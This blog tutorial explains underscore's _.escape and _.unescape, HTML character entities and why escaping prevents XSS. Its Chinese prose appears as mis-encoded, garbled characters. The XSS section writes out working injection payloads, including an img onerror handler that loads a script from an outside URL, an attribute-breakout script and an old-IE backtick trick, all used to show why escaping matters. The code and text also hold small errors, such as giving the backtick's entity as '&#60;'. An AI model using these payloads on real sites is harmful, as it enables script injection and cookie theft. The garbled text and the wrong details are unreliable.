---
title: underscore ç³»åˆ—ä¹‹å­—ç¬¦å®ä½“ä¸ _.escape
date: 2021-11-16 18:02:37
permalink: /pages/f7e68a/
categories:
  - å‰ç«¯æŠ€æœ¯
tags:
  - Webå¼€å‘
  - JavaScript
  - underscoreç³»åˆ—
author:
  name: Jamison
  link: https://github.com/oliver556
---

# underscore ç³»åˆ—ä¹‹å­—ç¬¦å®ä½“ä¸ _.escape

## ğŸ“–. å‰è¨€

underscore æä¾›äº† `_.escape` å‡½æ•°ï¼Œç”¨äºè½¬ä¹‰ HTML å­—ç¬¦ä¸²ï¼Œæ›¿æ¢ &, <, >, ", ', å’Œ ` å­—ç¬¦ä¸ºå­—ç¬¦å®ä½“ã€‚

```js
_.escape('Curly, Larry & Moe');
=> "Curly, Larry &amp; Moe"
```

underscore åŒæ ·æä¾›äº† `_.unescape` å‡½æ•°ï¼ŒåŠŸèƒ½ä¸ `_.escape` ç›¸åï¼š

```js
_.unescape('Curly, Larry &amp; Moe');
=> "Curly, Larry & Moe"
```

## ä¸€. XSS æ”»å‡»

å¯æ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦è½¬ä¹‰ HTML å‘¢ï¼Ÿ

ä¸¾ä¸ªä¾‹å­ï¼Œä¸€ä¸ªä¸ªäººä¸­å¿ƒé¡µçš„åœ°å€ä¸ºï¼š`www.example.com/user.html?name=kevin`ï¼Œæˆ‘ä»¬å¸Œæœ›ä»ç½‘å€ä¸­å–å‡ºç”¨æˆ·çš„åç§°ï¼Œç„¶åå°†å…¶æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œä½¿ç”¨ JavaScriptï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼š

```js
/**
 * è¯¥å‡½æ•°ç”¨äºå–å‡ºç½‘å€å‚æ•°
 */
function getQueryString(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]);
    return null;
}

var name = getQueryString('name');
document.getElementById("username").innerHTML = name;
```

å¦‚æœè¢«ä¸€ä¸ªåŒæ ·æ‡‚æŠ€æœ¯çš„äººå‘ç°çš„è¯ï¼Œé‚£ä¹ˆä»–å¯èƒ½ä¼šåŠ¨ç‚¹â€œåå¿ƒæ€â€ï¼š

æ¯”å¦‚æˆ‘æŠŠè¿™ä¸ªé¡µé¢çš„åœ°å€ä¿®æ”¹ä¸ºï¼š`www.example.com/user.html?name=<script>alert(1)</script>`ã€‚

å°±ç›¸å½“äº:

```js
document.getElementById("username").innerHTML = '<script>alert(1)</script>';
```

ä¼šæœ‰ä»€ä¹ˆæ•ˆæœå‘¢ï¼Ÿ

ç»“æœæ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰å‘ç”Ÿâ€¦â€¦

è¿™æ˜¯å› ä¸º:

> æ ¹æ® W3C è§„èŒƒï¼Œscript æ ‡ç­¾ä¸­æ‰€æŒ‡çš„è„šæœ¬ä»…åœ¨æµè§ˆå™¨ç¬¬ä¸€æ¬¡åŠ è½½é¡µé¢æ—¶å¯¹å…¶è¿›è¡Œè§£æå¹¶æ‰§è¡Œå…¶ä¸­çš„è„šæœ¬ä»£ç ï¼Œæ‰€ä»¥é€šè¿‡ innerHTML æ–¹æ³•åŠ¨æ€æ’å…¥åˆ°é¡µé¢ä¸­çš„ script æ ‡ç­¾ä¸­çš„è„šæœ¬ä»£ç åœ¨æ‰€æœ‰æµè§ˆå™¨ä¸­é»˜è®¤æƒ…å†µä¸‹å‡ä¸èƒ½è¢«æ‰§è¡Œã€‚

åƒä¸‡ä¸è¦ä»¥ä¸ºè¿™æ ·å°±å®‰å…¨äº†â€¦â€¦

ä½ æŠŠåœ°å€æ”¹æˆ `www.example.com/user.html?name=<img src=@ onerror=alert(1)>` çš„è¯ï¼Œå°±ç›¸å½“äºï¼š

```js
document.getElementById("d1").innerHTML="<img src=@ onerror=alert(1)>"
```

æ­¤æ—¶ç«‹åˆ»å°±å¼¹çª—äº† 1ã€‚

ä¹Ÿè®¸ä½ ä¼šæƒ³ï¼Œä¸å°±æ˜¯å¼¹çª—ä¸ª 1 å—ï¼Ÿè¿˜èƒ½æ€ä¹ˆæ ·ï¼Ÿèƒ½å†™å¤šå°‘ä»£ç ï¼Ÿ

é‚£æˆ‘æŠŠåœ°å€æ”¹æˆ `www.example.com/user.html?name=<img src=@ onerror='var s=document.createElement("script");s.src="https://mqyqingfeng.github.io/demo/js/alert.js";document.body.appendChild(s);' />` å‘¢ï¼Ÿ

å°±ç›¸å½“äºï¼š

```js
document.getElementById("username").innerHTML = "<img src=@ onerror='var s=document.createElement(\"script\");s.src=\"https://mqyqingfeng.github.io/demo/js/alert.js\";document.body.appendChild(s);' />";
```

æ•´ç†ä¸‹å…¶ä¸­ onerror çš„ä»£ç ï¼š

```js
var s = document.createElement("script");
s.src = "https://mqyqingfeng.github.io/demo/js/alert.js";
document.body.appendChild(s);
```

ä»£ç ä¸­å¼•å…¥äº†ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„è„šæœ¬ï¼Œè¿™æ ·åšçš„äº‹æƒ…å°±å¤šäº†ï¼Œä»å–ä½ çš„ cookieï¼Œå‘é€åˆ°é»‘å®¢è‡ªå·±çš„æœåŠ¡å™¨ï¼Œåˆ°ç›‘å¬ä½ çš„è¾“å…¥ï¼Œåˆ°å‘èµ· CSRF æ”»å‡»ï¼Œç›´æ¥ä»¥ä½ çš„èº«ä»½è°ƒç”¨ç½‘ç«™çš„å„ç§æ¥å£â€¦â€¦

æ€»ä¹‹ï¼Œå¾ˆå±é™©ã€‚

ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼Œæˆ‘ä»¬å¯ä»¥å°†ç½‘å€ä¸Šçš„å€¼å–åˆ°åï¼Œè¿›è¡Œä¸€ä¸ªç‰¹æ®Šå¤„ç†ï¼Œå†èµ‹å€¼ç»™ DOM çš„ innerHTMLã€‚

## äºŒ. å­—ç¬¦å®ä½“

é—®é¢˜æ˜¯æ€ä¹ˆè¿›è¡Œè½¬ä¹‰å‘¢ï¼Ÿè€Œè¿™å°±è¦è°ˆåˆ°å­—ç¬¦å®ä½“çš„æ¦‚å¿µäº†ã€‚

åœ¨ HTML ä¸­ï¼ŒæŸäº›å­—ç¬¦æ˜¯é¢„ç•™çš„ã€‚æ¯”å¦‚è¯´åœ¨ HTML ä¸­ä¸èƒ½ä½¿ç”¨å°äºå·ï¼ˆ<ï¼‰å’Œå¤§äºå·ï¼ˆ>ï¼‰ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯æ ‡ç­¾ã€‚

å¦‚æœå¸Œæœ›æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ HTML æºä»£ç ä¸­ä½¿ç”¨å­—ç¬¦å®ä½“ï¼ˆcharacter entitiesï¼‰ã€‚

å­—ç¬¦å®ä½“æœ‰ä¸¤ç§å½¢å¼ï¼š

1. `&entity_name;`
2. `&#entity_number;ã€‚`

æ¯”å¦‚è¯´æˆ‘ä»¬è¦æ˜¾ç¤ºå°äºå·ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å†™ï¼š`&lt`; æˆ– `&#60`;

å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä½¿ç”¨å®ä½“åè€Œä¸æ˜¯æ•°å­—çš„å¥½å¤„æ˜¯ï¼Œåç§°æ˜“äºè®°å¿†ã€‚ä¸è¿‡åå¤„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿè®¸å¹¶ä¸æ”¯æŒæ‰€æœ‰å®ä½“åç§°ï¼ˆä½†æ˜¯å¯¹å®ä½“æ•°å­—çš„æ”¯æŒå´å¾ˆå¥½ï¼‰ã€‚

ä¹Ÿè®¸ä½ ä¼šå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆ `<` çš„å­—ç¬¦å®ä½“æ˜¯ `&#60` å‘¢ï¼Ÿè¿™æ˜¯æ€ä¹ˆè¿›è¡Œè®¡ç®—çš„å‘¢ï¼Ÿ

å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯å–å­—ç¬¦çš„ unicode å€¼ï¼Œä»¥ `&#` å¼€å¤´æ¥åè¿›åˆ¶æ•°å­— æˆ–è€…ä»¥ `&#x` å¼€å¤´æ¥åå…­è¿›åˆ¶æ•°å­—ã€‚ä¸¾ä¸ªä¾‹å­ï¼š

```js
var num = '<'.charCodeAt(0); // 60
num.toString(10) // '60'
num.toString(16) // '3c'
```

æˆ‘ä»¬å¯ä»¥ä»¥ `&#60`; æˆ–è€… `&#x3c`; åœ¨ HTML ä¸­è¡¨ç¤ºå‡º `<`ã€‚

ä¸ä¿¡ä½ å¯ä»¥å†™è¿™æ ·ä¸€æ®µ HTMLï¼Œæ˜¾ç¤ºçš„æ•ˆæœéƒ½æ˜¯ `<`ï¼š

```html
<div>&lt;</div>
<div>&#60;</div>
<div>&#x3c;</div>
```

å†ä¸¾ä¸ªä¾‹å­ï¼šä»¥å­—ç¬¦ 'å–µ' ä¸ºä¾‹ï¼š

```js
var num = 'å–µ'.charCodeAt(0); // 21941
num.toString(10) // '21941'
num.toString(16) // '55b5'
```

åœ¨ HTML ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ `&#21941`; æˆ–è€… `&#x55b5` è¡¨ç¤ºå–µï¼Œä¸è¿‡ â€œå–µâ€ å¹¶ä¸å…·æœ‰å®ä½“åã€‚

## ä¸‰. è½¬ä¹‰

æˆ‘ä»¬çš„åº”å¯¹æ–¹å¼å°±æ˜¯å°†å–å¾—çš„å€¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¸ºå­—ç¬¦å®ä½“ã€‚

ä¸¾ä¸ªä¾‹å­ï¼Œå½“é¡µé¢åœ°å€æ˜¯ `www.example.com/user.html?name=<strong>123</strong>` æ—¶ï¼Œæˆ‘ä»¬é€šè¿‡ getQueryString å–å¾— name çš„å€¼ï¼š

```js
var name = getQueryString('name'); // <strong>123</strong>
```

å¦‚æœæˆ‘ä»¬ç›´æ¥ï¼š

```js
document.getElementById("username").innerHTML = name;
```

å¦‚æˆ‘ä»¬æ‰€çŸ¥ï¼Œä½¿ç”¨ innerHTML ä¼šè§£æå†…å®¹å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æ”¹å˜å…ƒç´ çš„ HMTL å†…å®¹ï¼Œæœ€ç»ˆï¼Œä»æ ·å¼ä¸Šï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä¸€ä¸ªåŠ ç²—çš„ 123ã€‚

å¦‚æœæˆ‘ä»¬è½¬ä¹‰ï¼Œå°† `<strong>123</strong>` ä¸­çš„ `<` å’Œ `>` è½¬ä¸ºå®ä½“å­—ç¬¦ï¼Œå³ `&lt;strong&gt;123&lt;/strong&gt;`ï¼Œæˆ‘ä»¬å†è®¾ç½® innerHTMLï¼Œæµè§ˆå™¨å°±ä¸ä¼šå°†å…¶è§£é‡Šä¸ºæ ‡ç­¾ï¼Œè€Œæ˜¯ä¸€æ®µå­—ç¬¦ï¼Œæœ€ç»ˆä¼šç›´æ¥æ˜¾ç¤º `<strong>123</strong>`ï¼Œè¿™æ ·å°±é¿å…äº†æ½œåœ¨çš„å±é™©ã€‚

## å››. æ€è€ƒ

é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å…·ä½“è¦è½¬ä¹‰å“ªäº›å­—ç¬¦å‘¢ï¼Ÿ

æƒ³æƒ³æˆ‘ä»¬ä¹‹æ‰€ä»¥è¦è½¬ä¹‰ `<` å’Œ `>` ï¼Œæ˜¯å› ä¸ºæµè§ˆå™¨ä¼šå°†å…¶è®¤ä¸ºæ˜¯ä¸€ä¸ªæ ‡ç­¾çš„å¼€å§‹æˆ–ç»“æŸï¼Œæ‰€ä»¥è¦è½¬ä¹‰çš„å­—ç¬¦ä¸€å®šæ˜¯æµè§ˆå™¨ä¼šç‰¹æ®Šå¯¹å¾…çš„å­—ç¬¦ï¼Œé‚£è¿˜æœ‰ä»€ä¹ˆå­—ç¬¦ä¼šè¢«ç‰¹æ®Šå¯¹å¾…çš„å‘¢ï¼Ÿ(O_o)??

`&` æ˜¯ä¸€ä¸ªï¼Œå› ä¸ºæµè§ˆå™¨ä¼šè®¤ä¸º & æ˜¯ä¸€ä¸ªå­—ç¬¦å®ä½“çš„å¼€å§‹ï¼Œå¦‚æœä½ è¾“å…¥äº† `&lt;`ï¼Œæµè§ˆå™¨ä¼šå°†å…¶è§£é‡Šä¸º `<`ï¼Œä½†æ˜¯å½“ `&lt`; æ˜¯ä½œä¸ºç”¨æˆ·è¾“å…¥çš„å€¼æ—¶ï¼Œåº”è¯¥ä»…ä»…æ˜¯æ˜¾ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œè€Œä¸æ˜¯å°†å…¶è§£é‡Šä¸ºä¸€ä¸ª `<`ã€‚

`'` å’Œ `"` ä¹Ÿè¦æ³¨æ„ï¼Œä¸¾ä¸ªä¾‹å­ï¼š

æœåŠ¡å™¨ç«¯æ¸²æŸ“çš„ä»£ç ä¸ºï¼š

```js
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

input çš„å€¼å¦‚æœç›´æ¥æ¥è‡ªäºç”¨æˆ·çš„è¾“å…¥ï¼Œç”¨æˆ·å¯ä»¥è¾“å…¥ `"> <script>alert(1)</script>`ï¼Œæœ€ç»ˆæ¸²æŸ“çš„ HTML ä»£ç å°±å˜æˆäº†ï¼š

```html
<input type="name" value=""> <script>alert(1)</script>">
```

ç»“æœåˆæ˜¯ä¸€æ¬¡ XSS æ”»å‡»â€¦â€¦

æœ€åè¿˜æœ‰ä¸€ä¸ªæ˜¯åå¼•å· `ï¼Œåœ¨ IE ä½ç‰ˆæœ¬ä¸­(â‰¤ 8)ï¼Œåå¼•å·å¯ä»¥ç”¨äºå…³é—­æ ‡ç­¾ï¼š

```html
<img src="x` `<script>alert(1)</script>"` `>
```

æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆç¡®å®šçš„è¦è½¬ä¹‰çš„å­—ç¬¦ä¸ºï¼š&, <, >, ", ', å’Œ `ã€‚è½¬ä¹‰å¯¹åº”çš„å€¼ä¸ºï¼š

```
& --> &amp;
< --> &lt;
> --> &gt;
" --> &quot;
' --> &#x27;
` --> &#60;
```

å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šå•å¼•å·å’Œåå¼•å·ä½¿ç”¨æ˜¯å®ä½“æ•°å­—ã€è€Œå…¶ä»–ä½¿ç”¨çš„æ˜¯å®ä½“åç§°ï¼Œè¿™ä¸»è¦æ˜¯ä»å…¼å®¹æ€§çš„è§’åº¦è€ƒè™‘çš„ï¼Œæœ‰çš„æµè§ˆå™¨å¹¶ä¸èƒ½å¾ˆå¥½çš„æ”¯æŒå•å¼•å·å’Œåå¼•å·çš„å®ä½“åç§°ã€‚

## äº”. _.escape

é‚£ä¹ˆå…·ä½“æˆ‘ä»¬è¯¥å¦‚ä½•å®ç°è½¬ä¹‰å‘¢ï¼Ÿæˆ‘ä»¬ç›´æ¥çœ‹ä¸€ä¸ªç®€å•çš„å®ç°ï¼š

```js
var _ = {};

var escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '`': '&#x60;'
};

_.escape = function(string) {
    var escaper = function(match) {
        return escapeMap[match];
    };
    // ä½¿ç”¨éæ•è·æ€§åˆ†ç»„
    var source = '(?:' + Object.keys(escapeMap).join('|') + ')';
    console.log(source) // (?:&|<|>|"|'|`)
    var testRegexp = RegExp(source);
    var replaceRegexp = RegExp(source, 'g');

    string = string == null ? '' : '' + string;
    return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
}
```

å®ç°çš„æ€è·¯å¾ˆç®€å•ï¼Œæ„é€ ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦èƒ½åŒ¹é…åˆ°ï¼Œå¦‚æœèƒ½åŒ¹é…åˆ°ï¼Œå°±æ‰§è¡Œ replaceï¼Œæ ¹æ® escapeMap å°†ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼Œå¦‚æœä¸èƒ½åŒ¹é…ï¼Œè¯´æ˜ä¸éœ€è¦è½¬ä¹‰ï¼Œç›´æ¥è¿”å›åŸå­—ç¬¦ä¸²ã€‚

å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨ä»£ç ä¸­æ‰“å°äº†æ„é€ å‡ºçš„æ­£åˆ™è¡¨è¾¾å¼ä¸ºï¼š

```
(?:&|<|>|"|'|`)
```

å…¶ä¸­çš„ `?:` æ˜¯ä¸ªä»€ä¹ˆæ„æ€ï¼Ÿæ²¡æœ‰è¿™ä¸ª `?:` å°±ä¸å¯ä»¥åŒ¹é…å—ï¼Ÿæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ã€‚

## å…­. éæ•è·åˆ†ç»„

`(?:pattern)` è¡¨ç¤ºéæ•è·åˆ†ç»„ï¼Œå³ä¼šåŒ¹é… pattern ä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚

æˆ‘ä»¬æ¥çœ‹ä¸ªä¾‹å­ï¼š

```js
function replacer(match, p1, p2, p3) {
    // matchï¼Œè¡¨ç¤ºåŒ¹é…çš„å­ä¸² abc12345#$*%
    // p1ï¼Œç¬¬ 1 ä¸ªæ‹¬å·åŒ¹é…çš„å­—ç¬¦ä¸² abc
    // p2ï¼Œç¬¬ 2 ä¸ªæ‹¬å·åŒ¹é…çš„å­—ç¬¦ä¸² 12345
    // p3ï¼Œç¬¬ 3 ä¸ªæ‹¬å·åŒ¹é…çš„å­—ç¬¦ä¸² #$*%
    return [p1, p2, p3].join(' - ');
}
var newString = 'abc12345#$*%'.replace(/([^\d]*)(\d*)([^\w]*)/, replacer); // abc - 12345 - #$*%
```

ç°åœ¨æˆ‘ä»¬ç»™ç¬¬ä¸€ä¸ªæ‹¬å·ä¸­çš„è¡¨è¾¾å¼åŠ ä¸Š `?:`ï¼Œè¡¨ç¤ºç¬¬ä¸€ä¸ªæ‹¬å·ä¸­çš„å†…å®¹ä¸éœ€è¦å‚¨å­˜ç»“æœï¼š

```js
function replacer(match, p1, p2) {
    // matchï¼Œè¡¨ç¤ºåŒ¹é…çš„å­ä¸² abc12345#$*%
    // p1ï¼Œç°åœ¨åŒ¹é…çš„æ˜¯å­—ç¬¦ä¸² 12345
    // p1ï¼Œç°åœ¨åŒ¹é…çš„æ˜¯å­—ç¬¦ä¸² #$*%
    return [p1, p2].join(' - ');
}
var newString = 'abc12345#$*%'.replace(/(?:[^\d]*)(\d*)([^\w]*)/, replacer); // 12345 - #$*%
```

åœ¨ `_.escape` å‡½æ•°ä¸­ï¼Œå³ä½¿ä¸ä½¿ç”¨ `?:` ä¹Ÿä¸ä¼šå½±å“åŒ¹é…ç»“æœï¼Œåªæ˜¯ä½¿ç”¨ `?:` æ€§èƒ½ä¼šæ›´é«˜ä¸€ç‚¹ã€‚

## ä¸ƒ. åè½¬ä¹‰

æˆ‘ä»¬ä½¿ç”¨äº† `_.escape` å°†æŒ‡å®šå­—ç¬¦è½¬ä¸ºå­—ç¬¦å®ä½“ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªæ–¹æ³•å°†å­—ç¬¦å®ä½“è½¬ä¹‰å›æ¥ã€‚

å†™æ³•ä¸ `_.unescape` ç±»ä¼¼ï¼š

```js
var _ = {};

var unescapeMap = {
    '&amp;': '&',
    '&lt;': '<',
    '&gt;': '>',
    '&quot;': '"',
    '&#x27;': "'",
    '&#x60;': '`'
};

_.unescape = function(string) {
    var escaper = function(match) {
        return unescapeMap[match];
    };
    // ä½¿ç”¨éæ•è·æ€§åˆ†ç»„
    var source = '(?:' + Object.keys(unescapeMap).join('|') + ')';
    console.log(source) // (?:&|<|>|"|'|`)
    var testRegexp = RegExp(source);
    var replaceRegexp = RegExp(source, 'g');

    string = string == null ? '' : '' + string;
    return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
}

console.log(_.unescape('Curly, Larry &amp; Moe')) // Curly, Larry & Moe
```

## å…«. æŠ½è±¡

ä½ ä¼šä¸ä¼šè§‰å¾— `_.escape` ä¸ `_.unescape` çš„ä»£ç å®åœ¨æ˜¯å¤ªåƒäº†ï¼Œä»¥è‡³äºè®©äººæ„Ÿè§‰å¾ˆå†—ä½™å‘¢ï¼Ÿ

é‚£ä¹ˆæˆ‘ä»¬åˆè¯¥å¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ

æˆ‘ä»¬å¯ä»¥å…ˆå†™ä¸€ä¸ª `_.invert` å‡½æ•°ï¼Œå°† escapeMap ä¼ å…¥çš„æ—¶å€™ï¼Œå¯ä»¥å¾—åˆ° unescapeMapï¼Œç„¶åæˆ‘ä»¬å†æ ¹æ®ä¼ å…¥çš„ map (escapeMap æˆ–è€… unescapeMap) ä¸åŒï¼Œè¿”å›ä¸åŒçš„å‡½æ•°ã€‚

å®ç°çš„æ–¹å¼å¾ˆç®€å•ï¼Œç›´æ¥çœ‹ä»£ç ï¼š

```js
/**
 * è¿”å›ä¸€ä¸ªobjectå‰¯æœ¬ï¼Œä½¿å…¶é”®ï¼ˆkeysï¼‰å’Œå€¼ï¼ˆvaluesï¼‰å¯¹æ¢ã€‚
 * _.invert({a: "b"});
 * => {b: "a"};
 */
_.invert = function(obj) {
    var result = {};
    var keys = Object.keys(obj);
    for (var i = 0, length = keys.length; i < length; i++) {
        result[obj[keys[i]]] = keys[i];
    }
    return result;
};

var escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '`': '&#x60;'
};
var unescapeMap = _.invert(escapeMap);

var createEscaper = function(map) {
    var escaper = function(match) {
        return map[match];
    };
    // ä½¿ç”¨éæ•è·æ€§åˆ†ç»„
    var source = '(?:' + _.keys(map).join('|') + ')';
    var testRegexp = RegExp(source);
    var replaceRegexp = RegExp(source, 'g');
    return function(string) {
        string = string == null ? '' : '' + string;
        return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
    };
};

_.escape = createEscaper(escapeMap);
_.unescape = createEscaper(unescapeMap);
```
